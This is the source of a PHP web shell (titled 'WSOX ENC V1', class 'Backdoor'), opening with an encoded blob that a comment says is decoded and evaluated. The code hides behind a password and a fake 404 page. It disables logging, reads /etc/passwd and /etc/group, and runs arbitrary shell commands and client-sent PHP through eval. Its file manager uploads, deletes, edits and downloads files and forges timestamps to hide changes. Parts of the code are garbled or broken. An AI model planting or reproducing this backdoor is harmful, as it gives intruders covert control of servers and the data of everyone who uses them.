CD5MCWgQR4wMZnYmlYf4oTj+l2RnuSloykgxZUaMwOgTtaFfPcw0hQ5OvY6UnE1sYc2qZusIyPdXI8loWZ+LuCV8kgj//t1tBB0e2qTNxuHmxDLF+GPLqtBsfJoKwmXYdQ5ndC955lVTxx0wFQTj/b2mFxq3ykq43a5dME+kou37UvlYvm1TYJn4bw4swYIwmzJVEo2MloNMRybqUGDJ1EOLfaTSSXAbYZs8Erc13wCHf63dBNEdiluwdM0aFwv+M2Vngxf+pcSF0iHiigCxk7eT0LBiwYNAC1AuVvTdLg0WEcL74DQLAcYEcULMuAMV4Gws6iedL85Jj6iRtm5MyO14RN4D0yG03KTSSR2kkkfS9iVTjfw9uZFZOFlTCnA8QHJY9mDYQTScLiQdSIWfbyMw43P3se3uH/d4hz+7R3ItLjS81vtXEdgSs25+E3qG/ZXFmY2LaZUw5/fRtFNgrCy3FTF9E6rQpCwVjOl8WF2Gl3jPNtB+40gRdxjYVDPjrCNyvDA0RsxIDC9+IsO4SH7rz8QYMmm7AdrlzbYggVy20IxSkZRYw1ongK8PCIW9wYTYtMSpTnkzwM9s/94l+Ta6q5XfgpXalAyB6WlfMO/gm4BgbSpbnthZfB+IWFa5bfFfmLpSURJbYxcjL0NeIqAbNgS1uABsZQA4VDBWKVBliow6FUuLa1kt/SpVKXWmU/TbQDDcnVMBhus1cYqa0Bc6pD5GbM3FtsrrfHruRlNjrvdNUSvU56scMxCN9qAuj+UmTqGZRGAM72KXKDhQr6Q6yBUyhW9HJI1UiAiSuErbBtXYGbTQvtWtc1jV7uAWJKlwgRTIjPZ63Bgm6YMpIylaaVxNc3IaDx9YZkrFGF8HDSiQeRy58I2KKSgos4c1FKTGBTE7WgIRHAdHdaJTKG77PBWFyEFSOKeJgYbO4EWflOiJjOoBOlVNQW/QVrckP5VYr6ajyB5fZAsRlEnAhIi32rgbxNvDpcoU3bCC/QTYFDgJkQYojy6Qf/9ORWyDhx2PdnDwj4gHT7soAGNh0KaQgn1SsEjdb1UfFEYDMVjOD4XYsfdaCY+uzC861C3bQRJeNwgailNYQioSjqgs37I5r3BRLKBNJD3V55DCgKoLRNZCCN09ySuiAVoYrjao3XDtnorbG11xYvHc0/Rzh79i8oML9h3q5UM10kjJtp+YCVtY4pZAAfhj1A6jHzWRVDsNMkvFnILABSQqdLcjoftXEoXyakKkmzuTYCw1yGo4/GrGbYei2CLJnLMrc8XpD9c2BJ4t3w7ngRj831P9+j5RnHQ7qyokybS65GdoFGuGsj6ivG/2Kd9uuw5E09Mq5DmDuDfJIG8/HgITzMLZayOHNYrgpDdfMRkUwOyhl7ypZ3ym54hsY5we3x7iW9mt1HnhTogdN+XHvysLQJUzhC+0sbJC1ulRoz/ffNrQ3pgZR6GALrLwkf03sRbi1FYW5dWsl9Z37IUJfp+7fqGRH5Wx8up0FrGKxX1VisH6LTeIO93Ml3JDKcXxQkUTyYqVf1DwlxIeDTd/b7CSYW7uxh7+2HBLS1DrfWRi546mVz0XzWN7cdZZ08vVQod4A5n4OaCGzpt45ZQE8FQej8JiRDzxkcKxBjaU0mXH2kURtp7cssumdzW/A0EgLx91ZQNA9bboJeAvUVghKTeO3JWJ6hsIwEkRjs93Y/1t2NtiW9gjitCNuTdiPz4znjTdU/rrb+UhOzBNbLJsslBM81Pr3N8gZPxO0gIGBVw1an0LxJ6wj/AvQUgS8YAd2g5z74hJ2T84/72t9ynr2s9/HfNF1JyHdslPafCdaw18xDWgbCr8D7JbYvfum3ahxRSdu8iTrRO5s1HwIAn/wNCEfjCPpJpNIoPwdzWPnqgCNvDSXRPH67cmMk8QvPLfYRJCASwNXmdiZXvpAQCNILizOHvL4ig3Sht1sPGQs6hx/MRn1Hb6hXE36t2ZeuBy7JJ0W31R4RbyuFFwrlUa1Qwrt++/811F3+9RN5GnjJKUUrZmD2wpkp3qaBeNRXds9q+02Uo/qKvZKHmvJDKUHhN63lLPIYOrtzBgmvih3u3vdwb33u97pSzjai4pvolBUa21WP/vdt0gT58tGJAX69ZlQ6Qh8wuw07v+n4zUy20ubRp5KmqFkjQDCnyoav0en2AdJQ19Je88rxvVnTbbESFUtCJKzqRGwU8jSHE9VMQ3i0xGj7H6EK0cdOHBi+0Os4PjqjJVPMvBFHGcPxJWsm9YOt5ZrXyXVsezONaaLo3tM4eTx5gFrAnBETcnYRBsTypObvdiV24lCgpRwWALKgfEfjKQO2Ghpubz0KX7W2VKaHnFkbmPAhaZfBW5M4Ee6jaQ/b9VjWIxiAXDH4Wp18gXwVIEHSgY27uA3wk/HQuS04opnejUbisWc9oKslKez+Iua7Ie3BPSgNorUHscQO4vGm++7rxG2HsqTxhjdFbBnHpqRDtxxQBMNhOJFfHcXujeyHRaAXghN2BOTKBL8zaTbe3oltOzZmRB6wCGXe/5zPy+HZKVtp7LTEdzb+RgjIa0rkR/at2/TGDr8k7tNMhXTYcvd/+HjwpgGZEIXzXUYGFa+9Au1rQYEBbIiozFGgHcqiMjXbBHdKhEqlzMb+CIEdylcxek+cdC4+Mu6pOm7OKOR4uGRlurzFvpKtG07WWby4sHjZ24ZJs5jHz7mnRVKGx/KgDK1iKwjSukFKciMhQytODaAhCAFxSzthxZsqFO2JbQM9JzQz5YEN8Q8tSVzm7cy4KUeJrzad+p53xHm12MnU6RE6spGHtkkfo4qbey/29fjOwWHL4D2xONo1mt9gySGBPvC8/fsePpa/OfxYz5/MUrM0zloI9HuO41lA6w8/HjLkD6OoIKOiCxgUt9trKkDvC6AYnVvkdT1/MumaLFrePnhWwEEUhnzS0xYM9yCSfF2ASjFUuDnQqQosgdvpvyr9CqO6OcpfdNhAQ7MuSu8TGlHoWdNOqb78myIPrdzOvhnmmJfxS8Ib+WpUfFsTOP3yL9h3N1U3OSILrj34yj+6msUuNMzbxTyMWWT/iG2kwBoQ4psTU6J6zlPxGK3Vvm2qOhDprzvBtRwJSeg/fgf/XTu9Q2nzzOh8cldzicF31ecJHgiudv5dL+ZDevP242yF27PWhZsBdgoiqYZf4aYSA2HauzdQ/uHPf+/XxTDva8TcA5FDhiS7vVj/PQzd9ns2b0fg3BSH7+92e8+97De7+evTa/5HY67nLfNd83l3gNFrJuUtcL+AWva2ByQz6rOqITXsGqcf8yIiyN81+ysTocOLOyG3OjJod/MtIcNxKpWi/30lXssqmrpaDmgXc5dCLevZdx3ou73vmNeWlxJWy4Q757rAiHnNc+8yrPZ+86xrG+6+dvvEqFf+UoRL+gaMkaU0V/0SFTtbbxb1rUU1sKoejcpLtK66qyo+8uxQrV5pusm+8umqu+1ZdF98kXXVXdpyvJpoTd9VdbO4VJbOn9IX3VHMjog70nwtyE3PrdqVN6etBmziw0rXFlmN1Zt+z+pZ6djqqOoNPCNWLYKrdwrit15P9Qz4ZWcYtT7ZtgVsZR9HNadB4JfuHPzUMssPgRuvWXWB6aoVAhXQ29qkbaw90cdArxf5ro3SrAs5aRB1QVP/TDKQ7+Bp2pmVasslVrBdrhjudaxOzST8wwwGiYRMW+q22cQLOQ/+CiecQoa3yDNY3KA99mpbPKF3FO5FsmkxpKPDrZPY9WiL36udT2lWen1MM2pexzSWLbvCe8T3MmDFdMXq1LZSTxIumixcP9W+vx+E3qoQhnbIlOPbaTftzrPDEd7ngOv2xC3IAcDla68Pqd0GtzbdLZldezbL7cntpM49P9Z4paUhwWcqOAG/onV6oNRHxqpMyqy4cM7VC5y3h7dvyg+DG0UO7qiDNFouqz4kH30wUaaFs+znysqF0be5ow55RdClHuMl9+3JmVJW1rW2HGXe8LeqNWXlor6s70xOzc6g0iXeFVCW+nz82FRpXNJ7DY6bZn4Jt8tfUyTjsyVO9sLf88yO7sfM2xCWKp667tdSJUA4Czej5//n6sKKUIcVxECZAF8ol+17pit/ErNuS6UJkRR2NFShVIl2wC879Ra82jtYfFzJe';

// The data block will be first reversed, base64 decoded and than uncompressed
// @eval( gzuncompress( base64_decode( strrev( $unknown_data_block ) ) ) );

// The uncompressed data block
?>
<?php 

if( @function_exists("ini_restore") ){
    @ini_restore("log_errors");
    @ini_restore("error_log");
    @ini_restore("error_reporting");
    @ini_restore("disable_function");
}

if(@function_exists("ini_set")){
    @ini_set("log_errors_max_len",0);
    @ini_set("error_log",null);
    @ini_set("log_errors",0);
    @ini_set("max_execution_time",0);
    @ini_set("memory_limit","1000M");
    @ini_set("file_uploads",1);
    @ini_set("safe_mode",0);
    @ini_set("open_basedir",null);
    @ini_set("safe_mode_exec_dir","");
    @ini_set("disable_function","");
}

if(@function_exists("set_magic_quotes_runtime")){
    
    if(version_compare(phpversion(),"5.4.0","<"))magic_quotes_runtime(0);
}


class Backdoor{

    public $_wu;
    public $hsh;
    public $http_host_hash;
    public $green_color;
    public $charset;
    public $disabled_functions;
    public $current_working_dir;
    public $file_dir;
    public $document_root;
    public $safe_mode;
    public $_rfi;
    public $user_passwords=array();
    public $user_groups=array();
    
    function set_cookie($cookie_name,$hash){
        $_COOKIE[$cookie_name]=$hash;
        @setcookie($cookie_name,$hash);
    }
    
    function set_http_host_hash_cookie(){
        $this->set_cookie($this->http_host_hash,"");
    }
    
    function authenticate(){

        $this->hsh = "582681c2eae02b3f";
        $passed_hash = "";
        $cookie_key="_".substr( sha1($_SERVER["HTTP_HOST"]), 0, 3 );
        
        if(isset($_REQUEST["px"])){
            $passed_hash = substr( sha1($_REQUEST["px"]), 0, 16 );
        }elseif(isset($_COOKIE[$cookie_key])){
            $passed_hash = $_COOKIE[$cookie_key];
        }
        
        if( $passed_hash != $this->hsh ){

            $not_found_html = <<<HTML
                <body oncontextmenu="return false">
                <script>
                    document.writeln("404 Not Found");
                    document.onkeydown = function(e) {
                        if (e.ctrlKey && (e.keyCode === 67 || e.keyCode ===  86 || e.keyCode === 85 || e.keyCode === 117)) return false;
                    };
                    window.onclick = function(e) {
                        if (!e.ctrlKey) return; 
                        document.writeln('<form action="" method="post"><input type="text" name="px"><input type="submit" value=">>"></form>');
                    }
                </script>
                </body>
            HTML;

            die( $not_found_html );

        }
        
        $this->set_cookie($cookie_key,$this->hsh);
    }
    
    function set_doc_vars(){
        $this->http_host_hash="_".substr( sha1($_SERVER["HTTP_HOST"] ),0,3);
        $this->green_color="#df5";
        $this->charset="UTF- 8";
    }
    
    function init(){

        if(@function_exists("ini_get")){
            $safe_mode=@ini_get("safe_mode");
            $disabled_functions=@ini_get("disable_functions");
        }
        
        if(!$safe_mode&&@function_exists("error_reporting"))error_reporting(0);
        
        if(!$safe_mode&&@function_exists("set_time_limit"))set_time_limit(0);
        
        if(!$safe_mode&&@function_exists("ignore_user_abort"))ignore_user_abort(true);
        
        if(@function_exists("get_magic_quotes_gpc")&&@function_exists("stripslashes")){

            if(@get_magic_quotes_gpc()){

                function remove_slashes($input){
                    
                    foreach($input as $key => $value){

                        if(is_array($value)){
                            $input[$key]=remove_slashes( $value );
                        } else {
                            $input[$key]=stripslashes( $value );
                        }

                    }
                    
                    return($input);
                }
                
                $_GET= remove_slashes($_GET);
                $_POST= remove_slashes($_POST);
                $_COOKIE= remove_slashes($_COOKIE);
            }
        }
        
        define("PE",@function_exists("posix_geteuid"));
        define("WI",strtolower(substr(PHP_OS,0,3))=="win");
        
        if(strtolower(substr(PHP_OS,0,3))=="win") {
            $operating_system="win";
        } else {
            else $operating_system="nix";
        }
        
        if(!PE&&!WI){

            if(@is_readable("/etc/passwd")){

                $_sy=file("/etc/passwd");
                
                foreach($_sy as$_wo){
                    $_wo=explode(":",$_wo);
                    $user_passwords[$_wo[2]]=$_wo[0];
                }
            }

            if(@is_readable("/etc/group")){

                $_sy=file("/etc/group");
                foreach($_sy as$_wo){
                    $_wo=explode(":",$_wo);
                    $user_groups[$_wo[2]]=$_wo[0];
                }
            }
        }
        
        $document_root=$_SERVER["DOCUMENT_ROOT"];
        
        if(@function_exists("getcwd"))$file_dir=@getcwd();else $file_dir=@dirname(__FILE__);
        
        if(isset($_POST["c"])&&$_POST["c"]!="")$_POST["c"]=str_rot13($_POST["c"]);
        
        if(isset($_POST["c"])){
            if(@function_exists("chdir"))@chdir($_POST["c"]);
        }
        
        if(@function_exists("getcwd")){
            $current_working_dir=@getcwd();
        }elseif(isset($_POST["c"])&&$_POST["c"]!="")$current_working_dir=$_POST["c"];else $current_working_dir=$file_dir;
        
        if($operating_system=="win"){
            $file_dir=str_replace("\x5c","/",$file_dir);
            $current_working_dir=str_replace("\\","/",$current_working_dir);
        }
            
        if($current_working_dir[strlen($current_working_dir)-1]!="/")$current_working_dir.="/";
        
        $this->disabled_functions=$disabled_functions;
        $this->current_working_dir=$current_working_dir;
        $this->file_dir=$file_dir;
        $this->document_root=$document_root;
        $this->safe_mode=$safe_mode;
        $this->operating_system = $operating_system;
    }
        
    function exec_shell_command(){
        
        if(!empty($_POST["p"]))$_POST["p"]=@base64_decode($_POST["p"]);
        
        if(!empty($_POST["p"])&&!empty($_POST["x"])){
            
            $this->set_cookie("_sto",true);
            $_POST["p"].=" 2>&1";
        }elseif(!empty($_POST["p"]))$this->set_cookie("_sto",0);
        
        echo <<<HTML
            <script>
                if(window.Event) window.captureEvents(Event.KEYDOWN);
                var cmds=new Array('');
                var cur=0;
                function kp(e){
                    var n=(window.Event) ? e.which : e.keyCode;
                
                    if(n==38){
                        cur--;
                        
                        if(cur>=0)document.cf.cmd.value=cmds[cur];else cur++;
                    
                    }else if(n==40){
                        cur++;
                        if(cur < cmds.length)document.cf.cmd.value=cmds[cur];else cur--;
                    }
                }
                function add(cmd){
                    cmds.pop();
                    cmds.push(cmd);
                    cmds.push('');
                    cur=cmds.length-1;
                }
            </script>
        HTML;
        
        echo <<<HTML
            <h1>Exec</h1>
            <div class=content>
                <form name=cf onsubmit=\"
                    if(d.cf.cmd.value=='clear'){
                        d.cf.output.value='';
                        d.cf.cmd.value='';
                        return false;
                    }
                    add(this.cmd.value);
                    g(null,null,utoa(this.cmd.value),this.show_errors.checked ? 1 : '' );
                    return false;
                ">
            HTML;
        
        echo "<input type=checkbox name=show_errors value=1 ". 
            (!empty($_POST["x"])||$_COOKIE["_sto"] ? " checked" : "" ) . '> redirect stderr to stdout (2>&1)</nobr><br/><textarea id=taid class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
            
        if(!empty($_POST["p"])){
            if(!empty($_SESSION["ex"]))echo$_SESSION["ex"];
            $_c=encode_html_entities("$ ".$_POST["p"]."\x0a".exec_shell_command($_POST["p"])."\x0a\012");
            echo$_c;
            $_SESSION["ex"]=$_SESSION["ex"].$_c;
        }else{
            unset($_SESSION["ex"]);
        }
        
        echo <<<HTML
            </textarea>
            <table style="border:1px solid #df5;background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%">
                <tr>
                    <td width="1%">$</td>
                    <td>
                        <input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);">
                    </td>
                </tr>
            </table>
            </form>
            </div>
            <script>
                d.cf.cmd.focus();
                var textar = document.getElementById("taid");
                textar.scrollTop = textar.scrollHeight;
            </script>
        HTML;
    }
    
    function execute_php_code(){
        
        ?>
            <h1>Execution PHP-code</h1>
            <div class=content>
                <form name=pf method=post onsubmit="g('ph',null,utoa(this.code.value),'');return false;">
                    <textarea name=code class=bigarea id=PhpCode>
                    
                    <?php

                        (!empty($_POST["p"])?encode_html_entities(@base64_decode($_POST["p"])):"")
                    ?>
    
                    </textarea>
                    
                    <input type=submit value=Eval style="margin-top:5px">
        
                </form>
                <pre 
                    id=PhpOutput 
                    style="<?php echo ( empty($_POST["p"])?"display:none;":""); ?>margin-top:5px;" 
                    class=ml1>
                    <?php    
                    
                    if(!empty($_POST["p"])){
                        @ob_start();
                        eval(@base64_decode($_POST["p"]));
                        echo encode_html_entities(ob_get_clean());
                    }
                    ?>
                </pre>
            </div>
            <?php
    }
    
    function get_php_info(){
        
        ?>
        <h1>PHP Info</h1>
        <div class=content>
        
            <?php
            @ob_start();
            @phpinfo();
            $_jbk=str_replace("<img ","<noimg ",@ob_get_clean());
            $_hgi=substr($_jbk,strpos($_jbk,"<style"));
            $_hgi=substr($_hgi,0,strpos($_hgi,"</style>")).", p, table, th, td {font-size:12px}</style>";
            $_hgi=str_replace(array("body","\x0a",","),array("p"," .php ",", .php "),$_hgi);
            $_hgi=@preg_replace("/\bbackground-color\b: #\x5b^;]+?;\s*/","",$_hgi);
            $_hgi=@preg_replace("/\bcolor\x5cb: #[^;]+?;\x5cs\x2a/","",$_hgi);
            $_jbk=substr($_jbk,strpos($_jbk,"<body>")+(-01124+01132));
            $_jbk=substr($_jbk,-0640- -0640,strrpos($_jbk,"</body>"));
            $_jbk=@preg_replace("/<h1>PHP Credits<\x5c/h1>.+/ms","",$_jbk);
            
            ?>
            <div class="php">,<?php echo $_hgi;?>,<?php echo $_jbk;?>,</div>
            
        </div><?php
    }
    
    function file_manager(){
        $current_working_dir=$this->current_working_dir;
        
        if(!empty($_POST["p"])){
            $_otq=@filemtime($_POST["c"]);
            
            switch($_POST["p"]){
                case "uploadFile":
                case "uf":
                    if(!@move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]))echo"Can't upload file!";
                    elseif($_otq)@touch($_FILES["f"]["name"],$_otq,$_otq);
                    break;
                case "mkdir":
                case "md":
                    if(!@mkdir(str_rot13($_POST["x"])))echo"Can't create new dir";elseif($_otq)@touch(str_rot13($_POST["x"]),$_otq,$_otq);
                    break;
                case "delete":
                case "de":
                    function _pfmf($_v){
                        $_v=(substr($_v,-1)=="/")?$_v:$_v."/";
                        if($_tz=@opendir($_v)){
                            while(($_otj=@readdir($_tz))!==false){
                                $_otj=$_v.$_otj;
                                
                                if((@basename($_otj)=="..")||(@basename($_otj)=="."))continue;
                                
                                $_ryz=@filetype($_otj);
                                
                                if($_ryz=="dir")_pfmf($_otj);else @unlink($_otj);
                            
                            }
                            
                            @closedir($_tz);
                        }
                        
                        @rmdir($_v);
                    }
                    
                    if(@is_array($_POST["f"])) {

                        foreach($_POST["f"] as$_gr){
                            if($_gr=="..")continue;
                            
                            $_gr=str_rot13(urldecode($_gr));
                            
                            if(@is_dir($_gr))_pfmf($_gr);else @unlink($_gr);
                        }

                    }
                    break;
            }
                    
            if($_otq)touch($_POST["c"],$_otq,$_otq);
        }
        
        ?>
        <h1>File manager</h1>
        <div class=content>
            <script>
                p_=x_=s_="";
            </script>
            <?php
            $_u=scan_dir(isset($_POST["c"])?$_POST["c"]:$current_working_dir);
            
            if($_u===false){
                echo"Can't open this folder!";
                return;
            }
            
            global $_o;$_o=array("name",1);
            
            if(!empty($_POST["p"])){
                if(@preg_match("!s_([A-\x7a]+)_(\d{1})!",$_POST["p"],$_uzf))$_o=array($_uzf[1],(int)$_uzf[2]);
            }
            
            ?>
            <script>
                function sa(){
                    for(i=0;i<d.files.elements.length;i++)if(d.files.elements[i].type=='checkbox')d.files.elements[i].checked=d.files.elements[0].checked;
                }
            </script>
            <table width='100%' class='main' cellspacing='0' cellpadding='2'>
                <form name=files method=post>
                    <tr>
                        <th width='13px'>
                            <input type=checkbox onclick='sa()' class=chkbx>
                        </th>
                        <th width='40%'>
                            <a href='#' onclick='g("fm",null,"s_name_<?php echo ($_o[1]? 0:1);?>")'>Name</a>
                        </th>
                        <th>
                            <a href='#' onclick='g("fm",null,"s_size_<?php echo ($_o[1]?0:1);?>")'>Size</a>
                        </th>
                        <th>
                            <a href='#' onclick='g("fm",null,"s_modify_<?php echo $_o[1]?0:1; ?>")'>Modify</a>
                        </th>
                        <th>
                            <a href='#' onclick='g("fm",null,"s_perms_<?php echo $_o[1]?0:1; ?>")'>Permissions</a>
                        </th>
                        <th width='200px'>Actions</th>
                    </tr>
                    <?php
                    $_npj=$_db=array();
                    $_l=count($_u);
                    
                    for($_hpa=0;$_hpa<$_l;$_hpa++){
                        $_eg=array(
                            "name"=>$_u[$_hpa],
                            "path"=>$current_working_dir.$_u[$_hpa],
                            "modify"=>@date("Y-m-d H:i:s",@filemtime($current_working_dir.$_u[$_hpa])),
                            "perms"=>get_file_perms_html($current_working_dir.$_u[$_hpa]),
                            "size"=>@filesize($current_working_dir.$_u[$_hpa])
                        );
                        
                        if(@is_file($current_working_dir.$_u[$_hpa]))$_db[]=@array_merge($_eg,array("type"=>"file"));elseif(@is_link($current_working_dir.$_u[$_hpa]))$_npj[]=@array_merge($_eg,array("type"=>"link","link"=>readlink($_eg["path"])));elseif(@is_dir($current_working_dir.$_u[$_hpa]))$_npj[]=@array_merge($_eg,array("type"=>"dir"));
                    }
    
                    function _oqe($_sy,$_tot){
                        
                        global $_o;
                        if($_o[0341+-0203-073- -037+0706-0746+-042]!="size")return @strcmp(strtolower($_sy[$_o[0]]),strtolower($_tot[$_o[0]]))*($_o[-01127+-017+-0614- -0156-021+01626] ? 0535-0470-0674+01004+-0154:-(-0730+01366-01064+-01203- -0112+01346-01315+01467));else return(($_sy["size"]<$_tot["size"])?-(-063+0231-0145):-0642+-0725+01570)*($_o[-0113+0100- -0257+-0176-0216+0250-0120+00+0113-072]?0402+-0401:-(-01005- -0303-0265+0256+0377- -0235-0307+-0150+01012+-0455));
                    }
                    
                    @usort($_db,"wCmp");
                    @usort($_npj,"wCmp");
                    $_db=@array_merge($_npj,$_db);
                    $_w=0;
                    
                    foreach($_db as$_gr){
                        $_m=str_rot13(urlencode($_gr["name"]));
                        
                        
                        echo "<tr". ( $_w ? " class=l1" : "") . '>' . 
                            "<td>
                                <input type=checkbox name=\"f[]\" value=\"{$_m}\" class=chkbx>
                            </td>" .
                            "<td>
                                <a href=# onclick=\"" . ( ( $_gr["type"]=="file" ) ? "g('ft',null,'{$_m}', 'view')\">" . encode_html_entities( $_gr["name"] ): "g('fm','".str_rot13($_gr["path"])."');\" " . (empty($_gr["link"])? "" :"title='".$_gr["link"]."'").">
                                    <b>[ ".encode_html_entities($_gr["name"])." ]</b>")."
                                </a>
                            </td>
                            <td>".(($_gr["type"]=="file")?get_file_size_human_readable($_gr["size"]):$_gr["type"])."</td>
                            <td>".$_gr["modify"]."</td>
                            <td>
                                <a href=# onclick=\"g('ft',null,'".$_m."','chmod')\">".$_gr["perms"].
                            "</td>
                            <td>
                                <a href=\"#\" onclick=\"g('ft',null,'".$_m."', 'rename')\">Rename</a>
                                <a href=\"#\" onclick=\"g('ft',null,'".$_m."', 'touch')\">Touch</a>".
                                (
                                    ($_gr["type"]=="file") ? 
                                        "<a href=\"#\" onclick=\"g('ft',null,'".$_m."', 'edit')\">Edit</a>
                                        <a href=\"#\" onclick=\"g('ft',null,'".$_m."', 'dl')\">Download</a>" : "" 
                                ).
                            "</td>
                        </tr>";
                        
                        $_w= $_w ? 0:1;
                    }
                    echo "
                        <tr>
                            <td colspan=7>\015\012\x09\x09
                                <input type=hidden name=a value='fm'>\x0d\012\011\x09
                                <input type=hidden name=c value='".encode_html_entities(str_rot13($current_working_dir))."'>\x0d\012\011\011
                                <input type=hidden name=ch value='".(isset($_POST["ch"])?$_POST["ch"]:"")."'>\015\x0a\011\011
                                <select name='p'>
                                    <option value='de'>Delete</option>
                                </select>&nbsp;
                                <input type='submit' value='>>'>
                            </td>
                        </tr>
                </form>
            </table>
        </div>";
    }
    
    function file_tools(){

        if(isset($_POST["p"]))$_POST["p"]=str_rot13(urldecode($_POST["p"]));

        if(isset($_POST["x"])){
            switch($_POST["x"]){
                case "download":
                case "dl":
                    if(@is_file($_POST["p"])&&@is_readable($_POST["p"])){
                        @ob_start("ob_gzhandler",4096);
                        @header("Content-Disposition: attachment; filename=".@basename($_POST["p"]));
                        
                        if(@function_exists("mime_content_type")){
                            $_ryz=@mime_content_type($_POST["p"]);
                            @header("Content-Type: ".$_ryz);
                        }else @header("Content-Type: application/octet-stream");
                        
                        $_gk=@fopen($_POST["p"],"r");
                        
                        if($_gk){
                            while(!@feof($_gk))echo @fgets($_gk,1024);@fclose($_gk);
                        }
                    }
                    exit;
                    break;
                case "mkfile":
                    if(!@file_exists($_POST["p"])){
                        $_oo=@filemtime($_POST["c"]);
                        $_gk=@fopen($_POST["p"],"w");
                        
                        if($_gk){
                            @fclose($_gk);
                            
                            if($_oo){
                                @touch($_POST["c"],$_oo,$_oo);
                                @touch($_POST["p"],$_oo,$_oo);
                            }
                            $_POST["x"]="edit";
                        }
                    }
                    break;
            }
        }
        echo"<h1>File tools</h1><div class=content>";
        
        if(!@file_exists($_POST["p"])){
            echo"File not exists";
            return;
        }
        
        $_gn=@stat($_POST["p"]);
        
        if(PE){
            $_gzl=@posix_getpwuid($_zse[4]);
            $_hxq=$_gzl["name"];
        }elseif(!empty($user_passwords[$_gn[4]])){
            $_hxq=$user_passwords[$_gn[4]];
        }else{
            $_hxq=$_gn[4];
        }
        
        if(PE){
            $_gzl=@posix_getgrgid($_gn[5]);
            $_t=$_gzl["name"];
        }elseif(!empty($user_groups[$_gn[5]]))$_t=$user_groups[$_gn[5]];else{
            $_t=$_gn[5];
        }

        echo"<span>Name:</span> ".encode_html_entities(@basename($_POST["p"]))." <span>Size:</span> ".(@is_file($_POST["p"])?get_file_size_human_readable(@filesize($_POST["p"])):"-")." <span>Permission:</span> ".get_file_perms_html($_POST["p"])." <span>Owner/Group:</span> ".$_hxq."/".$_t."<br>";echo"<span>Change time:</span> ".@date("Y-m-d H:i:s",@filectime($_POST["p"]))." <span>Access time:</span> ".@date("Y-m-d H:i:s",@fileatime($_POST["p"]))." <span>Modify time:</span> ".@date("Y-m-d H:i:s",@filemtime($_POST["p"]))."<br><br>";
        
        if(empty($_POST["x"]))$_POST["x"]="view";
        
        if(@is_file($_POST["p"]))$_dv=array("View","Download","Edit","Chmod","Rename","Touch");else $_dv=array("Chmod","Rename","Touch");
        
        foreach($_dv as$_wo)echo"<a href=# onclick=\"g(null,null,'".urlencode(str_rot13($_POST["p"]))."','".@strtolower($_wo)."')\">".((@strtolower($_wo)==$_POST["x"])?"<b>[ ".$_wo." ]</b>":$_wo)."</a> ";echo"<br><br>";
        
        switch($_POST["x"]){
            case "view":
            case "vw":
                echo"<pre class=ml1>";
                $_gk=@fopen($_POST["p"],"r");
                
                if($_gk){
                    while(!@feof($_gk))echo encode_html_entities(@fgets($_gk,1024));
                    @fclose($_gk);
                }
                echo"</pre>";
                break;
            case "chmod":
            case "cm":
                if(!empty($_POST["s"])){
                    $_ue=0;
                    for($_hpa=strlen($_POST["s"])-1;$_hpa>=0;--$_hpa)$_ue+=(int)$_POST["s"][$_hpa]*@pow(8,(strlen($_POST["s"])-$_hpa-1));
                    
                    if(!@chmod($_POST["p"],$_ue))echo"Can't set permissions!<br><script>document.mf.s.value="";</script>";
                }
                @clearstatcache();
                echo"<script>s_="";</script><form onsubmit=\"g(null,null,'".urlencode(str_rot13($_POST["p"]))."',null,this.chmod.value);return false;\"><input type=text name=chmod value=\"".substr(@sprintf("%o",@fileperms($_POST["p"])),-4)."\"><input type=submit value=\">>\"></form>";
                break;
            case "edit":
            case "ed":
                if(!@is_writable($_POST["p"])){
                    echo"File isn't writeable";
                    break;
                }if(!empty($_POST["s"])){
                    $_otq=@filemtime($_POST["p"]);
                    $_POST["s"]=substr($_POST["s"],1);
                    $_POST["s"]=@base64_decode($_POST["s"]);
                    $_gk=@fopen($_POST["p"],"w");
                    
                    if($_gk){
                        @fputs($_gk,$_POST["s"]);
                        @fclose($_gk);
                        echo"Saved!<br><script>s_="";</script>";
                    }
                }
                echo"<form onsubmit=\"g(null,null,'".urlencode(str_rot13($_POST["p"]))."','edit','1'+utoa(this.text.value));return false;\"><textarea name=text class=bigarea>";
                $_gk=@fopen($_POST["p"],"r");
                if($_gk){
                    while(!@feof($_gk))echo encode_html_entities(@fgets($_gk,1024));
                    @fclose($_gk);
                }
                echo"</textarea><input type=submit value=\"Save\"></form>";
                if($_otq)@touch($_POST["p"],$_otq,$_otq);
                @clearstatcache();
                break;
            case "rename":
            case "rn":
                $_oo=@filemtime($_POST["c"]);
                if(!empty($_POST["s"])){
                    if(!@rename($_POST["p"],str_rot13($_POST["s"])))echo"Can't rename!<br>";else{
                        if($_oo)@touch($_POST["c"],$_oo,$_oo);
                        die("<script>g(null,null,\"".urlencode($_POST["s"])."\",null,"")</script>");
                    }
                }
                @clearstatcache();
                echo"<form onsubmit=\"g(null,null,'".urlencode(str_rot13($_POST["p"]))."',null,rot13(this.name.value));return false;\"><input type=text name=name value=\"".encode_html_entities($_POST["p"])."\"><input type=submit value=\">>\"></form>";
                break;
            case "touch":
            case "tc":if(!empty($_POST["s"])){
                $_otq=@strtotime($_POST["s"]);
                if($_otq){
                    if(!@touch($_POST["p"],$_otq,$_otq))echo"Fail!";else echo"Touched!";
                }else echo"Bad time format!";
            }
            @clearstatcache();
            echo"<script>s_="";</script><form onsubmit=\"g(null,null,'".urlencode(str_rot13($_POST["p"]))."',null,this.touch.value);return false;\"><input type=text name=touch value=\"".@date("Y-m-d H:i:s",@filemtime($_POST["p"]))."\"><input type=submit value=\">>\"></form>";
            break;
        }
        echo"</div>";
    }
    
    function upper_document_part(){

        $green_color=$this->green_color;
        $charset=$this->charset;
        $current_working_dir=$this->current_working_dir;
        $file_dir=$this->file_dir;
        $document_root=$this->document_root;
        $http_host_hash=$this->http_host_hash;
        $safe_mode=$this->safe_mode;
        $_rfi=$this->_rfi;
        
        if(empty($_POST["ch"]))$_POST["ch"]=$charset;
        
        @header("Content-Type: text/html; charset=".$_POST["ch"]);
        
        echo 
            "<html>
                <head>
                    <meta http-equiv='Content-Type' content='text/html; charset={$_POST['ch']}'>
                    <title>{$_SERVER["HTTP_HOST"]} - WSOX ENC V1</title>\x0d\x0a\x09\x09
                    <style>
                        body{background-color:#444;color:#e1e1e1;}
                        body,td,th{font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1;}
                        table.info{color:#fff;background-color:#222;}
                        span,h1,a{color: {$green_color} !important;}
